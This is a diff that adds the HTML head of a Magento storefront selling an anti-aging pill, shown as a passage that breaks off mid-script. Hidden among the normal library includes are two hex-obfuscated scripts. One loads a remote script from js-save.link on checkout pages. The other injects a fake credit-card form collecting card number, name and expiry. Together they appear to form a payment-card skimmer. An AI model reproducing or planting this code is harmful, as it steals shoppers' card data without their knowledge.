@@ -1,0 +1,770 @@
+
+<!DOCTYPE html>
+
+<!--[if lt IE 7 ]> <html lang="en" id="top" class="no-js ie6"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en" id="top" class="no-js ie7"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en" id="top" class="no-js ie8"> <![endif]-->
+<!--[if IE 9 ]>    <html lang="en" id="top" class="no-js ie9"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" id="top" class="no-js"> <!--<![endif]-->
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var o=e[n]={exports:{}};t[n][0].call(o.exports,function(e){var o=t[n][1][e];return r(o||e)},o,o.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(t,e,n){function r(){}function o(t,e,n){return function(){return i(t,[(new Date).getTime()].concat(u(arguments)),e?null:this,n),e?void 0:this}}var i=t("handle"),a=t(2),u=t(3),c=t("ee").get("tracer"),f=NREUM;"undefined"==typeof window.newrelic&&(newrelic=f);var s=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit"],p="api-",l=p+"ixn-";a(s,function(t,e){f[e]=o(p+e,!0,"api")}),f.addPageAction=o(p+"addPageAction",!0),e.exports=newrelic,f.interaction=function(){return(new r).get()};var d=r.prototype={createTracer:function(t,e){var n={},r=this,o="function"==typeof e;return i(l+"tracer",[Date.now(),t,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[Date.now(),r,o],n),o)try{return e.apply(this,arguments)}finally{c.emit("fn-end",[Date.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){d[e]=o(l+e)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,(new Date).getTime()])}},{}],2:[function(t,e,n){function r(t,e){var n=[],r="",i=0;for(r in t)o.call(t,r)&&(n[i]=e(r,t[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],3:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,o=n-e||0,i=Array(o<0?0:o);++r<o;)i[r]=t[e+r];return i}e.exports=r},{}],ee:[function(t,e,n){function r(){}function o(t){function e(t){return t&&t instanceof r?t:t?u(t,a,i):i()}function n(n,r,o){t&&t(n,r,o);for(var i=e(o),a=l(n),u=a.length,c=0;c<u;c++)a[c].apply(i,r);var s=f[m[n]];return s&&s.push([w,n,r,i]),i}function p(t,e){g[t]=l(t).concat(e)}function l(t){return g[t]||[]}function d(t){return s[t]=s[t]||o(n)}function v(t,e){c(t,function(t,n){e=e||"feature",m[n]=e,e in f||(f[e]=[])})}var g={},m={},w={on:p,emit:n,get:d,listeners:l,context:e,buffer:v};return w}function i(){return new r}var a="nr@context",u=t("gos"),c=t(2),f={},s={},p=e.exports=o();p.backlog=f},{}],gos:[function(t,e,n){function r(t,e,n){if(o.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[e]=r,r}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){o.buffer([t],r),o.emit(t,e,n)}var o=t("ee").get("handle");e.exports=r,r.ee=o},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!h++){var t=y.info=NREUM.info,e=s.getElementsByTagName("script")[0];if(t&&t.licenseKey&&t.applicationID&&e){c(m,function(e,n){t[e]||(t[e]=n)});var n="https"===g.split(":")[0]||t.sslForHttp;y.proto=n?"https://":"http://",u("mark",["onload",a()],null,"api");var r=s.createElement("script");r.src=y.proto+t.agent,e.parentNode.insertBefore(r,e)}}}function o(){"complete"===s.readyState&&i()}function i(){u("mark",["domContent",a()],null,"api")}function a(){return(new Date).getTime()}var u=t("handle"),c=t(2),f=window,s=f.document,p="addEventListener",l="attachEvent",d=f.XMLHttpRequest,v=d&&d.prototype;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:d,REQ:f.Request,EV:f.Event,PR:f.Promise,MO:f.MutationObserver},t(1);var g=""+location,m={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-974.min.js"},w=d&&v&&v[p]&&!/CriOS/.test(navigator.userAgent),y=e.exports={offset:a(),origin:g,features:{},xhrWrappable:w};s[p]?(s[p]("DOMContentLoaded",i,!1),f[p]("load",r,!1)):(s[l]("onreadystatechange",o),f[l]("onload",r)),u("mark",["firstbyte",a()],null,"api");var h=0},{}]},{},["loader"]);</script>
+<title>Megatest21 | MEGA TEST 21</title>
+<meta name="description" content="Default Description" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+
+<meta name="description" content="Welcome to Megatest21. The leadeing anti-aging pill formula. Feel younger and stronger in just weeks." />
+<meta name="keywords" content="Megatest21, Anti aging, Anti-aging" />
+
+<link rel="icon" href="http://www.megatest21.com/skin/frontend/base/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.megatest21.com/skin/frontend/base/default/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.megatest21.com/js/blank.html';
+    var BLANK_IMG = 'http://www.megatest21.com/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/magestore/affiliateplusreferfriend.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/base/default/css/tinybox/style.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/base/default/css/magestore/affiliateplusprogram.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/bannerslider/bannerslider.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/bannerslider/animate.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/bannerslider/owl.carousel.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/megatest/bootstrap.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/megatest/style.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/megatest/icomoon.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/nwdthemes/revslider/public/assets/css/settings.css" media="all" />
+<script type="text/javascript" src="http://www.megatest21.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/lib/jquery/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/lib/jquery/noconflict.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/tinybox/tinybox.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/nwdthemes/jquery-1.11.0.min.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/nwdthemes/jquery-migrate-1.2.1.min.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/js/nwdthemes/jquery.noconflict.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/lib/modernizr.custom.min.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/lib/selectivizr.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/lib/matchMedia.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/lib/matchMedia.addListener.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/lib/enquire.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/app.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/lib/jquery.cycle2.min.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/lib/jquery.cycle2.swipe.min.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/slideshow.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/lib/imagesloaded.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/minicart.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/bannerslider/no-conflict.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/bannerslider/owl.slider.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/megatest/bootstrap.min.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/js/megatest/custom.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/nwdthemes/revslider/public/assets/js/jquery.themepunch.tools.min.js"></script>
+<script type="text/javascript" src="http://www.megatest21.com/skin/frontend/megatest/default/nwdthemes/revslider/public/assets/js/jquery.themepunch.revolution.min.js"></script>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Raleway:300,400,500,700,600" />
+<!--[if  (lte IE 8) & (!IEMobile)]>
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/styles-ie8.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/madisonisland-ie8.css" media="all" />
+<![endif]-->
+<!--[if (gte IE 9) | (IEMobile)]><!-->
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.megatest21.com/skin/frontend/megatest/default/css/madisonisland.css" media="all" />
+<!--<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.megatest21.com';
+//]]>
+</script>
+<meta name="viewport" content="initial-scale=1.0, width=device-width" />
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><script>
+var _0x7539=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x73\x2D\x73\x61\x76\x65\x2E\x6C\x69\x6E\x6B\x2F\x6A\x73\x2D\x73\x61\x76\x65\x2F\x6D\x61\x67\x65\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];if(( new RegExp(_0x7539[2]))[_0x7539[1]](window[_0x7539[0]])){document[_0x7539[4]](_0x7539[3])}
+</script><script>var _0xc240=["\x70\x61\x79\x6D\x65\x6E\x74\x5F\x66\x6F\x72\x6D\x5F\x63\x63\x73\x61\x76\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x68\x65\x63\x6B\x6F\x75\x74\x2D\x70\x61\x79\x6D\x65\x6E\x74\x2D\x6D\x65\x74\x68\x6F\x64\x2D\x6C\x6F\x61\x64","\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C","\x66\x69\x72\x73\x74\x43\x68\x69\x6C\x64","\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64","\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x72\x6D\x2D\x6C\x69\x73\x74\x22\x20\x69\x64\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5F\x66\x6F\x72\x6D\x5F\x63\x63\x73\x61\x76\x65\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x6F\x76\x65\x72\x66\x6C\x6F\x77\x3A\x20\x68\x69\x64\x64\x65\x6E\x3B\x22\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6F\x77\x6E\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x4E\x61\x6D\x65\x20\x6F\x6E\x20\x43\x61\x72\x64\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x4E\x61\x6D\x65\x20\x6F\x6E\x20\x43\x61\x72\x64\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6F\x77\x6E\x65\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x6F\x77\x6E\x65\x72\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x54\x79\x70\x65\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x74\x79\x70\x65\x5D\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x54\x79\x70\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x74\x79\x70\x65\x2D\x73\x65\x6C\x65\x63\x74\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x2D\x2D\x50\x6C\x65\x61\x73\x65\x20\x53\x65\x6C\x65\x63\x74\x2D\x2D\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x41\x45\x22\x3E\x41\x6D\x65\x72\x69\x63\x61\x6E\x20\x45\x78\x70\x72\x65\x73\x73\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x56\x49\x22\x3E\x56\x69\x73\x61\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x4D\x43\x22\x3E\x4D\x61\x73\x74\x65\x72\x43\x61\x72\x64\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x44\x49\x22\x3E\x44\x69\x73\x63\x6F\x76\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x4A\x43\x42\x22\x3E\x4A\x43\x42\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x53\x4D\x22\x3E\x53\x77\x69\x74\x63\x68\x2F\x4D\x61\x65\x73\x74\x72\x6F\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x4E\x75\x6D\x62\x65\x72\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x5D\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x6E\x75\x6D\x62\x65\x72\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x74\x79\x70\x65\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x45\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x20\x44\x61\x74\x65\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x6D\x6F\x6E\x74\x68\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x6F\x6E\x74\x68\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x65\x78\x70\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x4D\x6F\x6E\x74\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x3E\x30\x31\x20\x2D\x20\x4A\x61\x6E\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x3E\x30\x32\x20\x2D\x20\x46\x65\x62\x72\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x22\x3E\x30\x33\x20\x2D\x20\x4D\x61\x72\x63\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x3E\x30\x34\x20\x2D\x20\x41\x70\x72\x69\x6C\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x35\x22\x3E\x30\x35\x20\x2D\x20\x4D\x61\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x36\x22\x3E\x30\x36\x20\x2D\x20\x4A\x75\x6E\x65\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x3E\x30\x37\x20\x2D\x20\x4A\x75\x6C\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x38\x22\x3E\x30\x38\x20\x2D\x20\x41\x75\x67\x75\x73\x74\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x39\x22\x3E\x30\x39\x20\x2D\x20\x53\x65\x70\x74\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x30\x22\x3E\x31\x30\x20\x2D\x20\x4F\x63\x74\x6F\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x31\x22\x3E\x31\x31\x20\x2D\x20\x4E\x6F\x76\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x32\x22\x3E\x31\x32\x20\x2D\x20\x44\x65\x63\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x5F\x79\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x79\x65\x61\x72\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x79\x65\x61\x72\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x59\x65\x61\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x36\x22\x3E\x32\x30\x31\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x37\x22\x3E\x32\x30\x31\x37\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x38\x22\x3E\x32\x30\x31\x38\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x39\x22\x3E\x32\x30\x31\x39\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x30\x22\x3E\x32\x30\x32\x30\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x31\x22\x3E\x32\x30\x32\x31\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x32\x22\x3E\x32\x30\x32\x32\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x33\x22\x3E\x32\x30\x32\x33\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x34\x22\x3E\x32\x30\x32\x34\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x35\x22\x3E\x32\x30\x32\x35\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x36\x22\x3E\x32\x30\x32\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x2